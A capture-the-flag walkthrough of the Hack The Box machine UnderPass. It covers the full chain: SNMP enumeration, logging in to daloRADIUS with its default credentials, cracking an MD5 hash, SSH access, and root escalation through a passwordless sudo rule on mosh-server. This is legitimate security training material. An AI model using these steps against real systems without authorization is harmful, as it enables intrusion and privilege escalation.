# UnderPass HTB Walkthrough

This repository contains a full walkthrough of the **UnderPass** machine from **Hack The Box**, covering enumeration, exploitation, privilege escalation, and flag retrieval.

---

## Target Information

- **Machine Name:** UnderPass  
- **IP Address:** `10.10.11.48`  
- **Hostname:** `underpass.htb`

Before starting, add the target to your `/etc/hosts` file.

---

## System sSetup

### Add Host Entry

```bash
sudo nano /etc/hosts
```

Add the following line:

```text
10.10.11.48 underpass.htb
```

Verify:

```bash
sudo cat /etc/hosts
```

---

## Port Scanning

### Initial Nmap Scan

```bash
nmap -sV -Pn 10.10.11.48
```

This scan did not reveal useful services, so a deeper scan was required.

### UDP Scan

```bash
sudo nmap -sU underpass.htb -Pn
```

This revealed an SNMP service running on the target.

---

## Harvesting Using SNMP

`snmpbulkwalk` is used to efficiently retrieve large amounts of SNMP data using a single GETBULK request.

### SNMP Enumeration

```bash
snmpbulkwalk -c public -v2c underpass.htb
```

### Interesting Output

```text
steve@underpass.htb
UnDerPass.htb is the only daloradius server in the basin!
```

This information suggests the presence of a **daloRADIUS** server.

---

## Web Enumeration (daloRADIUS)

### Login Page

```text
http://underpass.htb/daloradius/app/operators/login.php
```

### Default Credentials

```text
Username: administrator
Password: radius
```

Successful login grants access to the daloRADIUS dashboard.

---

## Hash Cracking

Inside the **User List**, an MD5 password hash is discovered.

### Cracking Method

- Copy the MD5 hash
- Use CrackStation

```text
https://crackstation.net/
```

This reveals valid credentials for SSH access.

---

## User Flag

### SSH Login

```bash
ssh svcMosh@underpass.htb
```

Enter the cracked password when prompted.

### Retrieve User Flag

```bash
ls
cat user.txt
```

✅ **User flag obtained**

---

## Privilege Escalation (Root)

### Check Sudo Permissions

```bash
sudo -l
```

The user can run `mosh-server` as root without a password.

### Exploitation Steps

```bash
sudo /usr/bin/mosh-server new -p 61113
```

Set the MOSH key and connect:

```bash
MOSH_KEY=<KEY_FROM_OUTPUT> mosh-client 127.0.0.1 61113
```

---

## Root Flag

Once connected:

```bash
whoami
cd /root
ls -la
cat root.txt
```

🎉 **Root flag successfully retrieved!**

---

## Key Takeaways

- Always enumerate **UDP services**
- SNMP can leak **valuable credentials**
- Default credentials are common in misconfigured services
- `sudo -l` is critical for privilege escalation

---

## Tools Used

- Nmap
- SNMP tools (`snmpbulkwalk`)
- CrackStation
- SSH
- mosh-server

---

